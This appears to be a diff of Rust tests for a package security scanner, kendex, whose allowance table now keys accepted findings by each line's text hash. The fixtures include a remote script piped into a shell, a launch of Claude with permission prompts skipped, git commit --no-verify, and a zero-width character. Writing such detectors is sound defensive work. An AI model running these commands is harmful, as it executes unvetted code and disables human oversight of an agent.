@@ -15,10 +15,19 @@ use kendex_core::quality::{
 };
 
 const SCRIPT: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\n";
+/// The line of `SCRIPT` the switch's finding fires on.
+const LAUNCH: &str = "claude --dangerously-skip-permissions";
 const SWITCH: &str = "`--dangerously-skip-permissions` turns off permission prompts";
-/// The script with a trailing comment on the switch's line, and with a
+/// The script with a trailing comment on the switch's line, with a
+/// variation selector the rules read past on it, with a line inserted
+/// above it, with the shebang edited, with the line twice, and with a
 /// second switch on a line of its own.
 const EDITED: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions # now\n";
+const UNSEEN: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\u{FE0F}\n";
+const INSERTED: &str =
+    "#!/usr/bin/env bash\n# launches the lane\nclaude --dangerously-skip-permissions\n";
+const SHEBANG: &str = "#!/bin/bash\nclaude --dangerously-skip-permissions\n";
+const TWICE: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\nclaude --dangerously-skip-permissions\n";
 const TWO: &str =
     "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\ngit commit --no-verify\n";
 /// The switch, then a download piped into a shell: two rules whose
@@ -27,8 +36,8 @@ const TWO_RULES: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissi
 const PIPED: &str = "this line pipes a download straight into a shell from `https://x.example/i.sh`, so whatever the far end serves is what runs";
 const SKILL_MD: &str = "---\nname: launch\ndescription: launches a lane\n---\n\nLaunch it.\n";
 
-/// The table that accepts the switch on line 2 of the fixture's script.
-fn accepting(kind: ItemKind, name: &str, path: &str, text: &str) -> Allowance {
+/// The table that accepts the switch on the fixture's `LAUNCH` line.
+fn accepting(kind: ItemKind, name: &str, path: &str) -> Allowance {
     Allowance {
         ruleset: RULESET_VERSION,
         packages: vec![AllowedPackage {
@@ -36,10 +45,9 @@ fn accepting(kind: ItemKind, name: &str, path: &str, text: &str) -> Allowance {
             name: name.to_owned(),
             files: vec![AcceptedFile {
                 path: path.to_owned(),
-                hash: hash_bytes(text.as_bytes()),
                 accepted: vec![Accepted {
                     rule: "safety-bypass".to_owned(),
-                    line: Some(2),
+                    line_hash: hash_bytes(LAUNCH.as_bytes()),
                     message: SWITCH.to_owned(),
                 }],
             }],
@@ -83,7 +91,7 @@ fn placed(findings: &[kendex_core::quality::Finding]) -> Placed<'_> {
 
 /// The table with its one row changed.
 fn row_edited(edit: impl FnOnce(&mut Accepted)) -> Allowance {
-    let mut table = accepting(ItemKind::Skill, "launch", "scripts/launch.sh", SCRIPT);
+    let mut table = accepting(ItemKind::Skill, "launch", "scripts/launch.sh");
     edit(&mut table.packages[0].files[0].accepted[0]);
     table
 }
@@ -92,9 +100,11 @@ fn row_edited(edit: impl FnOnce(&mut Accepted)) -> Allowance {
 /// with the lines flagged and the lines accepted in the script.
 fn rows() -> Vec<Row<'static>> {
     use Publisher::{Kendex, Other};
-    let base = || accepting(ItemKind::Skill, "launch", "scripts/launch.sh", SCRIPT);
+    let base = || accepting(ItemKind::Skill, "launch", "scripts/launch.sh");
     vec![
         ("as recorded", SCRIPT, Kendex, base(), &[], &[2]),
+        ("a line inserted above", INSERTED, Kendex, base(), &[], &[3]),
+        ("another line edited", SHEBANG, Kendex, base(), &[], &[2]),
         (
             "the same bytes from another source",
             SCRIPT,
@@ -103,15 +113,10 @@ fn rows() -> Vec<Row<'static>> {
             &[2],
             &[],
         ),
-        ("the file edited", EDITED, Kendex, base(), &[2], &[]),
-        (
-            "a second finding in the accepted file",
-            TWO,
-            Kendex,
-            accepting(ItemKind::Skill, "launch", "scripts/launch.sh", TWO),
-            &[3],
-            &[2],
-        ),
+        ("the line edited", EDITED, Kendex, base(), &[2], &[]),
+        ("the line edited unseen", UNSEEN, Kendex, base(), &[2], &[]),
+        ("the line twice", TWICE, Kendex, base(), &[3], &[2]),
+        ("a second finding there", TWO, Kendex, base(), &[3], &[2]),
         (
             "another rule set",
             SCRIPT,
@@ -127,7 +132,7 @@ fn rows() -> Vec<Row<'static>> {
             "another package name",
             SCRIPT,
             Kendex,
-            accepting(ItemKind::Skill, "launcher", "scripts/launch.sh", SCRIPT),
+            accepting(ItemKind::Skill, "launcher", "scripts/launch.sh"),
             &[2],
             &[],
         ),
@@ -135,7 +140,7 @@ fn rows() -> Vec<Row<'static>> {
             "another kind",
             SCRIPT,
             Kendex,
-            accepting(ItemKind::Command, "launch", "scripts/launch.sh", SCRIPT),
+            accepting(ItemKind::Command, "launch", "scripts/launch.sh"),
             &[2],
             &[],
         ),
@@ -143,7 +148,7 @@ fn rows() -> Vec<Row<'static>> {
             "another path",
             SCRIPT,
             Kendex,
-            accepting(ItemKind::Skill, "launch", "launch.sh", SCRIPT),
+            accepting(ItemKind::Skill, "launch", "launch.sh"),
             &[2],
             &[],
         ),
@@ -156,10 +161,10 @@ fn rows() -> Vec<Row<'static>> {
             &[],
         ),
         (
-            "another line",
+            "another line's text",
             SCRIPT,
             Kendex,
-            row_edited(|row| row.line = Some(1)),
+            row_edited(|row| row.line_hash = hash_bytes(b"#!/usr/bin/env bash")),
             &[2],
             &[],
         ),
@@ -177,11 +182,10 @@ fn rows() -> Vec<Row<'static>> {
             TWO_RULES,
             Kendex,
             {
-                let mut table =
-                    accepting(ItemKind::Skill, "launch", "scripts/launch.sh", TWO_RULES);
+                let mut table = base();
                 table.packages[0].files[0].accepted.push(Accepted {
                     rule: "rce".to_owned(),
-                    line: Some(3),
+                    line_hash: hash_bytes(b"curl https://x.example/i.sh | sh"),
                     message: PIPED.to_owned(),
                 });
                 table
@@ -194,7 +198,9 @@ fn rows() -> Vec<Row<'static>> {
 
 /// One row per way the reading can differ from the row that accepted it.
 /// Every difference is a finding again: only kendex's own item, at the
-/// exact text, under the accepting rule set, at the recorded row.
+/// exact text of the line, under the accepting rule set, at the recorded
+/// row, one finding per row. An edit to any other line, one that moves the
+/// accepted line included, changes nothing.
 #[test]
 fn a_finding_is_accepted_only_for_kendex_at_the_exact_text_the_table_names() {
     let at = "skills/launch/scripts/launch.sh";
@@ -246,8 +252,7 @@ fn a_one_file_package_is_never_accepted() {
         },
     };
     for path in ["", "ship.md", "commands/ship.md"] {
-        let mut table = accepting(ItemKind::Command, "ship", path, text);
-        table.packages[0].files[0].accepted[0].line = Some(4);
+        let table = accepting(ItemKind::Command, "ship", path);
         let result = audit_with(input(), &table);
         assert_eq!(
             placed(&result.findings),
@@ -266,7 +271,7 @@ fn a_one_file_package_is_never_accepted() {
 #[test]
 #[allow(clippy::unwrap_used)]
 fn the_table_reads_back_as_written_and_refuses_a_key_it_does_not_read() {
-    let table = accepting(ItemKind::Skill, "launch", "scripts/launch.sh", SCRIPT);
+    let table = accepting(ItemKind::Skill, "launch", "scripts/launch.sh");
     let text = table.to_toml().unwrap();
     assert!(text.starts_with("# Findings kendex accepts"), "{text}");
     assert_eq!(Allowance::parse(&text).unwrap(), table, "{text}");
@@ -292,32 +297,30 @@ fn the_table_reads_back_as_written_and_refuses_a_key_it_does_not_read() {
     }
 }
 
-/// A catalog holding one skill whose script raises three findings under
-/// two rules, interleaved: a switch, a download piped into a shell, the
-/// switch again.
+/// The interleaved script: three findings under two rules, a switch, a
+/// download piped into a shell, the switch again.
+const INTERLEAVED: &str = "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\ncurl https://x.example/i.sh | sh\nclaude --dangerously-skip-permissions\n";
+
+/// A catalog holding one skill whose script is `script`.
 #[allow(clippy::unwrap_used)]
-fn interleaved_catalog() -> (tempfile::TempDir, kendex_core::source_read::SealedSource) {
+fn catalog(script: &str) -> (tempfile::TempDir, kendex_core::source_read::SealedSource) {
     let tmp = tempfile::tempdir().unwrap();
     let root = rooted(&tmp);
     let scripts = root.join("skills/launch/scripts");
     std::fs::create_dir_all(&scripts).unwrap();
     std::fs::write(root.join("skills/launch/SKILL.md"), SKILL_MD).unwrap();
-    std::fs::write(
-        scripts.join("launch.sh"),
-        "#!/usr/bin/env bash\nclaude --dangerously-skip-permissions\ncurl https://x.example/i.sh | sh\nclaude --dangerously-skip-permissions\n",
-    )
-    .unwrap();
+    std::fs::write(scripts.join("launch.sh"), script).unwrap();
     std::fs::write(root.join("kendex.toml"), "is_source_catalog = true\n").unwrap();
     let sealed = kendex_core::source_read::SealedSource::open(&root).unwrap();
     (tmp, sealed)
 }
 
-/// A row written by hand for each finding, in rule order A, B, A, with a
-/// stale hash and stale lines.
+/// A row written by hand for each finding of `INTERLEAVED`, in rule order
+/// A, B, A, with stale line hashes and messages.
 fn interleaved_rows() -> Allowance {
     let row = |rule: &str| Accepted {
         rule: rule.to_owned(),
-        line: Some(9),
+        line_hash: "stale".to_owned(),
         message: "stale".to_owned(),
     };
     Allowance {
@@ -327,7 +330,6 @@ fn interleaved_rows() -> Allowance {
             name: "launch".to_owned(),
             files: vec![AcceptedFile {
                 path: "scripts/launch.sh".to_owned(),
-                hash: "stale".to_owned(),
                 accepted: vec![row("safety-bypass"), row("rce"), row("safety-bypass")],
             }],
         }],
@@ -336,97 +338,94 @@ fn interleaved_rows() -> Allowance {
 
 /// The refresh reads every listed row again whatever order the rules
 /// interleave in: each rule once, one finding per row, written back in
-/// line order with the file's hash. An edit that moves the findings moves
-/// the rows with it: the next refresh writes the new hash and lines, the
-/// messages unchanged, and a refresh of its own output is a fixed point.
+/// line order, each keyed by its own line's text. A line inserted above
+/// the findings moves them and leaves the refreshed table as it was; an
+/// edit to an accepted line is written back as that line's new key; and a
+/// refresh of its own output is a fixed point.
 #[test]
 #[allow(clippy::unwrap_used)]
-fn the_refresh_reads_interleaved_rules_once_each_and_follows_a_moved_finding() {
-    let (_tmp, sealed) = interleaved_catalog();
+fn the_refresh_reads_interleaved_rules_once_each_and_keys_each_row_by_its_line() {
+    let (_tmp, sealed) = catalog(INTERLEAVED);
     let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
     let script = sealed.root().join("skills/launch/scripts/launch.sh");
     let refreshed = interleaved_rows().refreshed(&sealed, &config).unwrap();
-    let file = &refreshed.packages[0].files[0];
-    assert_eq!(file.hash, hash_bytes(&std::fs::read(&script).unwrap()));
-    let rows = |file: &AcceptedFile| -> Vec<(String, Option<u32>)> {
-        file.accepted
+    let rows = |table: &Allowance| -> Vec<(String, String)> {
+        table.packages[0].files[0]
+            .accepted
             .iter()
-            .map(|row| (row.rule.clone(), row.line))
+            .map(|row| (row.rule.clone(), row.line_hash.clone()))
             .collect()
     };
+    let keyed = |rule: &str, line: &str| (rule.to_owned(), hash_bytes(line.as_bytes()));
+    let piped = "curl https://x.example/i.sh | sh";
     assert_eq!(
-        rows(file),
+        rows(&refreshed),
         vec![
-            ("safety-bypass".to_owned(), Some(2)),
-            ("rce".to_owned(), Some(3)),
-            ("safety-bypass".to_owned(), Some(4)),
+            keyed("safety-bypass", LAUNCH),
+            keyed("rce", piped),
+            keyed("safety-bypass", LAUNCH),
         ],
-        "{:#?}",
-        file.accepted
+        "{refreshed:#?}"
     );
     assert!(
-        file.accepted.iter().all(|row| row.message != "stale"),
-        "{:#?}",
-        file.accepted
+        refreshed.packages[0].files[0]
+            .accepted
+            .iter()
+            .all(|row| row.message != "stale"),
+        "{refreshed:#?}"
     );
     assert_eq!(refreshed.refreshed(&sealed, &config).unwrap(), refreshed);
 
-    // A comment above the first switch moves every finding down a line
-    // and changes the text; nothing the rules match changes.
-    let mut edited = std::fs::read(&script).unwrap();
-    edited.splice(0..0, b"# launches the lane\n".iter().copied());
-    std::fs::write(&script, &edited).unwrap();
-    let moved = refreshed.refreshed(&sealed, &config).unwrap();
-    let file_moved = &moved.packages[0].files[0];
-    assert_eq!(file_moved.hash, hash_bytes(&edited));
-    assert_ne!(file_moved.hash, file.hash);
+    // A comment above the first switch moves every finding down a line;
+    // nothing the rows name changes.
+    std::fs::write(&script, format!("# launches the lane\n{INTERLEAVED}")).unwrap();
+    assert_eq!(refreshed.refreshed(&sealed, &config).unwrap(), refreshed);
+
+    // A comment on the piped line is an edit to that line alone.
+    let edited = INTERLEAVED.replace(piped, &format!("{piped} # bootstrap"));
+    std::fs::write(&script, edited).unwrap();
+    let following = refreshed.refreshed(&sealed, &config).unwrap();
     assert_eq!(
-        rows(file_moved),
+        rows(&following),
         vec![
-            ("safety-bypass".to_owned(), Some(3)),
-            ("rce".to_owned(), Some(4)),
-            ("safety-bypass".to_owned(), Some(5)),
+            keyed("safety-bypass", LAUNCH),
+            keyed("rce", &format!("{piped} # bootstrap")),
+            keyed("safety-bypass", LAUNCH),
         ],
-        "{:#?}",
-        file_moved.accepted
+        "{following:#?}"
     );
-    let messages = |file: &AcceptedFile| -> Vec<String> {
-        file.accepted
-            .iter()
-            .map(|row| row.message.clone())
-            .collect()
-    };
-    assert_eq!(messages(file_moved), messages(file));
 }
 
 /// One row per refusal the refresh makes, each with the words the error
 /// names its cause by: a package the catalog does not offer, a file the
-/// package does not hold as text, and a file whose findings under a rule
-/// are not one per listed row, in either direction. A refusal in place of
+/// package does not hold as text, a file whose findings under a rule are
+/// not one per listed row, in either direction, and a row for a finding
+/// at no line, which has no line text to key it by. A refusal in place of
 /// a rewrite is what keeps a finding nobody accepted out of the table.
 #[test]
 #[allow(clippy::unwrap_used)]
 fn the_refresh_refuses_each_row_the_catalog_no_longer_warrants() {
-    let (_tmp, sealed) = interleaved_catalog();
-    let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
     let with = |edit: fn(&mut Allowance)| {
         let mut table = interleaved_rows();
         edit(&mut table);
         table
     };
-    let rows: Vec<(&str, Allowance, &[&str])> = vec![
+    let rows: Vec<(&str, &str, Allowance, &[&str])> = vec![
         (
             "a package the catalog does not offer",
+            INTERLEAVED,
             with(|table| table.packages[0].name = "launcher".to_owned()),
             &["launcher"],
         ),
         (
             "a file the package does not hold",
+            INTERLEAVED,
             with(|table| table.packages[0].files[0].path = "scripts/gone.sh".to_owned()),
             &["launch", "scripts/gone.sh", "does not hold"],
         ),
         (
             "a rule raised once more than listed",
+            INTERLEAVED,
             with(|table| {
                 table.packages[0].files[0].accepted.pop();
             }),
@@ -438,14 +437,29 @@ fn the_refresh_refuses_each_row_the_catalog_no_longer_warrants() {
         ),
         (
             "a rule listed once more than raised",
+            INTERLEAVED,
             with(|table| {
                 let extra = table.packages[0].files[0].accepted[1].clone();
                 table.packages[0].files[0].accepted.push(extra);
             }),
             &["scripts/launch.sh", "2 accepted rce", "now holds 1"],
         ),
+        (
+            "a finding at no line",
+            "#!/usr/bin/env bash\necho re\u{200B}ady\n",
+            with(|table| {
+                table.packages[0].files[0].accepted = vec![Accepted {
+                    rule: "obfuscated-content".to_owned(),
+                    line_hash: "stale".to_owned(),
+                    message: "stale".to_owned(),
+                }];
+            }),
+            &["scripts/launch.sh", "obfuscated-content", "at no line"],
+        ),
     ];
-    for (row, table, expected) in rows {
+    for (row, script, table, expected) in rows {
+        let (_tmp, sealed) = catalog(script);
+        let config = kendex_core::source::source_config(&sealed, "cat").unwrap();
         let refused = table.refreshed(&sealed, &config).unwrap_err().to_string();
         for words in expected {
             assert!(refused.contains(words), "{row}: {refused}");
